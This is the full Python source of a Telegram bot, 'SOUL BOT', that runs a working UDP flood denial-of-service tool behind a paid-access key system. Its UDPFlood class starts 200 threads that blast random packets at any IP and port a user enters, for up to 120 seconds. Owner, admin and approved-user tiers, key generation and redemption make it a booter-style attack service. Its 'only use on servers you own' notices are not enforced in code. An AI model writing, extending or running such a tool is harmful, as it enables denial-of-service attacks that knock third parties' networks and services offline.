"""
SOUL BOT - UDP Stress Testing Only (Working Version)
"""

import asyncio
import logging
import os
import json
import string
import random
import sys
import socket
import threading
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))

# Data files
DATA_JSON = "users_data.json"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
active_attacks = {}
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

# --- Data Management Functions ---
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info(f"Data loaded")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        logger.info("Data saved")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

# --- Working UDP Flood Function ---
class UDPFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.packets_sent = 0
        self.threads = []
    
    def send_packets(self):
        """Send UDP packets in a thread"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Random payload (1024 bytes)
            payload = os.urandom(1024)
            
            end_time = time.time() + self.duration
            while self.running and time.time() < end_time:
                try:
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self.packets_sent += 1
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def start(self):
        """Start the UDP flood with multiple threads"""
        # Create multiple threads for high packet rate
        num_threads = 200  # Number of concurrent threads
        
        for i in range(num_threads):
            thread = threading.Thread(target=self.send_packets)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Wait for all threads to complete or timeout
        time.sleep(self.duration)
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            try:
                thread.join(timeout=1)
            except:
                pass
        
        return self.packets_sent

async def run_udp_flood(target_ip, port, duration, user_id):
    """Run UDP flood and send status updates"""
    try:
        # Create flood instance
        flood = UDPFlood(target_ip, port, duration)
        
        # Run in thread pool to not block
        loop = asyncio.get_event_loop()
        packets = await loop.run_in_executor(None, flood.start)
        
        return packets
    except Exception as e:
        logger.error(f"UDP flood error: {e}")
        return 0

# --- Keyboard Builders ---
def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 Check Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_approved_keyboard():
    keyboard = [
        [InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"

    welcome_msg = f"👋 **Welcome {user_name}!**\n\n"
    welcome_msg += "💥 **UDP Stress Testing Bot**\n"
    welcome_msg += "Send UDP packets to test network stability\n\n"

    if is_owner(user_id):
        welcome_msg += "🔑 **You are the Owner**\n"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        welcome_msg += "👮 **You are an Admin**\n"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        welcome_msg += "✅ **You are Approved**\n"
        keyboard = get_approved_keyboard()
    else:
        welcome_msg += "📌 **Welcome to the Bot**\nRedeem a key to get access.\n\n"
        keyboard = get_user_keyboard()

    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    callback_data = query.data

    if callback_data == "check":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await check_status(query.message)
        return

    elif callback_data == "approve":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`\nExample: `123456789 30`", parse_mode='Markdown')
        return

    elif callback_data == "disapprove":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:\nExample: `123456789`", parse_mode='Markdown')
        return

    elif callback_data == "add_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`\nExample: `987654321 60`", parse_mode='Markdown')
        return

    elif callback_data == "remove_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:\nExample: `987654321`", parse_mode='Markdown')
        return

    elif callback_data == "gen_key":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:\nExample: `30`", parse_mode='Markdown')
        return

    elif callback_data == "run":
        if not is_approved(user_id):
            await query.message.reply_text("❌ Not authorized. Please redeem a key first.")
            return
        user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
        await query.message.reply_text(
            "💥 **UDP Flood Attack**\n\n"
            "Send: `<IP> <PORT> <TIME>`\n\n"
            "Example: `8.8.8.8 53 30`\n\n"
            "⚠️ **Warning:** Only use on servers you own or have permission to test!",
            parse_mode='Markdown'
        )
        return

    elif callback_data == "stats":
        await show_stats(query.message, user_id)
        return

    elif callback_data == "my_status":
        await show_my_status(query.message, user_id)
        return

    elif callback_data == "redeem_key":
        user_state[user_id] = {'action': 'redeem', 'step': 'awaiting_key'}
        await query.message.reply_text("🎟️ Redeem Key\n\nSend your access key:", parse_mode='Markdown')
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_state:
        # Check if it's a direct attack command
        parts = text.strip().split()
        if len(parts) == 3 and parts[0].replace('.', '').isdigit():
            if is_approved(user_id):
                await process_run(update, text)
            else:
                await update.message.reply_text("❌ You are not approved. Please redeem a key first.")
        else:
            await update.message.reply_text("ℹ️ Use /start to see options.")
        return

    action = user_state[user_id].get('action')

    if action == 'approve':
        await process_approve(update, text)
    elif action == 'disapprove':
        await process_disapprove(update, text)
    elif action == 'add_admin':
        await process_add_admin(update, text)
    elif action == 'remove_admin':
        await process_remove_admin(update, text)
    elif action == 'gen_key':
        await process_gen_key(update, text)
    elif action == 'run':
        await process_run(update, text)
    elif action == 'redeem':
        await process_redeem(update, text)

async def process_approve(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][target_id] = {
            "expiry": expiry_date,
            "approved_by": user_id
        }

        save_data()
        await update.message.reply_text(f"✅ User Approved!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_disapprove(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
            save_data()
            await update.message.reply_text(f"❌ User {target_id} disapproved!")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_add_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["admins"][target_id] = {
            "expiry": expiry_date,
            "added_by": user_id
        }

        save_data()
        await update.message.reply_text(f"👮 Admin Added!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_remove_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(f"🚫 Admin {target_id} removed!")
        else:
            await update.message.reply_text(f"User {target_id} is not an admin.")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_gen_key(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()

        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }

        save_data()
        await update.message.reply_text(
            f"🎟️ **Key Generated!**\n\n"
            f"🔑 Key: `{key}`\n"
            f"📅 Valid for: {days} days\n\n"
            f"Share this key with users to grant access.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_run(update: Update, text: str):
    user_id = update.effective_user.id
    
    try:
        parts = text.strip().split()
        if len(parts) != 3:
            await update.message.reply_text(
                "❌ Invalid format.\n\n"
                "Use: `<IP> <PORT> <TIME>`\n"
                "Example: `8.8.8.8 53 30`",
                parse_mode='Markdown'
            )
            user_state.pop(user_id, None)
            return

        target_ip = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 1 or duration > 120:
            await update.message.reply_text("❌ Duration must be between 1 and 120 seconds.")
            user_state.pop(user_id, None)
            return
        
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1 and 65535.")
            user_state.pop(user_id, None)
            return
        
        # Check if IP is valid
        ip_parts = target_ip.split('.')
        if len(ip_parts) != 4:
            await update.message.reply_text("❌ Invalid IP address format.")
            user_state.pop(user_id, None)
            return
        
        # Confirm attack
        confirm_msg = f"⚠️ **UDP Flood Confirmation**\n\n"
        confirm_msg += f"Target: `{target_ip}:{port}`\n"
        confirm_msg += f"Duration: `{duration} seconds`\n"
        confirm_msg += f"Method: UDP Flood (200 threads)\n\n"
        confirm_msg += f"Type **YES** to start the attack:\n"
        confirm_msg += f"Type anything else to cancel."
        
        user_state[user_id] = {
            'action': 'confirm_attack',
            'target_ip': target_ip,
            'port': port,
            'duration': duration
        }
        await update.message.reply_text(confirm_msg, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers. Make sure PORT and TIME are numbers.")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        user_state.pop(user_id, None)

async def process_redeem(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        key = text.strip()

        if key not in data.get("keys", {}):
            await update.message.reply_text("❌ Invalid key.")
            user_state.pop(user_id, None)
            return

        key_data = data["keys"][key]

        if key_data.get("redeemed"):
            await update.message.reply_text("❌ Key already redeemed.")
            user_state.pop(user_id, None)
            return

        days = key_data.get("days", 0)
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][str(user_id)] = {
            "expiry": expiry_date,
            "approved_by": "key_redemption"
        }

        data["keys"][key]["redeemed"] = True
        data["keys"][key]["redeemed_by"] = user_id

        save_data()
        await update.message.reply_text(
            f"🎉 **Key Redeemed Successfully!**\n\n"
            f"✅ You now have access!\n"
            f"📅 Valid for: {days} days\n"
            f"⏰ Expires: {expiry_date}\n\n"
            f"🚀 Use `/start` to see your options.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# Handle attack confirmation
async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.upper()
    
    if user_id not in user_state:
        return
    
    state = user_state[user_id]
    if state.get('action') != 'confirm_attack':
        return
    
    if text == "YES":
        target_ip = state['target_ip']
        port = state['port']
        duration = state['duration']
        
        # Send starting message
        status_msg = await update.message.reply_text(
            f"💥 **UDP Flood Started!**\n\n"
            f"Target: `{target_ip}:{port}`\n"
            f"Duration: `{duration}s`\n"
            f"Threads: 200\n\n"
            f"⏳ Sending UDP packets...",
            parse_mode='Markdown'
        )
        
        try:
            # Run UDP flood
            packets = await run_udp_flood(target_ip, port, duration, user_id)
            
            # Send completion message
            await status_msg.edit_text(
                f"✅ **UDP Flood Completed!**\n\n"
                f"Target: `{target_ip}:{port}`\n"
                f"Duration: `{duration}s`\n"
                f"Packets Sent: `{packets:,}`\n\n"
                f"⚠️ Only use on authorized targets!",
                parse_mode='Markdown'
            )
        except Exception as e:
            await status_msg.edit_text(f"❌ UDP flood failed: {e}")
        
        user_state.pop(user_id, None)
    else:
        await update.message.reply_text("❌ UDP flood cancelled.")
        user_state.pop(user_id, None)

async def check_status(message):
    status_msg = (
        f"✅ **Bot Status**\n\n"
        f"💥 UDP Flood Attack Tool\n"
        f"• Protocol: UDP\n"
        f"• Method: Packet Flood\n"
        f"• Threads: 200 concurrent\n"
        f"• Max Duration: 120 seconds\n\n"
        f"👥 Total Users: {len(data.get('approved_users', {}))}\n"
        f"👮 Admins: {len(data.get('admins', {}))}\n\n"
        f"⚠️ **Legal Notice:** Only use on servers you own!"
    )
    await message.reply_text(status_msg, parse_mode='Markdown')

async def show_stats(message, user_id):
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))

    stats_msg = (
        f"📊 **System Statistics**\n\n"
        f"✅ Approved Users: {approved_count}\n"
        f"👮 Admins: {admin_count}\n"
        f"🎟️ Total Keys: {key_count}\n"
        f"✔ Redeemed Keys: {redeemed_count}\n\n"
        f"🔄 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await message.reply_text(stats_msg, parse_mode='Markdown')

async def show_my_status(message, user_id):
    if str(user_id) in data.get("approved_users", {}):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"✅ Status: Approved\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif str(user_id) in data.get("admins", {}):
        expiry = data["admins"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"👮 Status: Admin\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif is_owner(user_id):
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"🔑 Status: Owner\n"
            f"♾️ Access: Unlimited"
        )
    else:
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"❌ Status: No Access\n"
            f"💡 Redeem a key to get access!"
        )

    await message.reply_text(status_msg, parse_mode='Markdown')

# --- Main Function ---
async def run_bot():
    load_data()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex('^(YES|yes|Yes)$'), handle_confirmation))
    
    logger.info("=== SOUL BOT STARTED ===")
    logger.info(f"Owner ID: {OWNER_ID}")
    logger.info("UDP Flood Attack Tool - Working Version")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("Bot is polling for updates...")
    
    try:
        while True:
            await asyncio.sleep(60)
            save_data()
            logger.info("Heartbeat: Bot is running")
    except asyncio.CancelledError:
        logger.info("Bot stopped")
    finally:
        await app.stop()
        await app.shutdown()

def main():
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()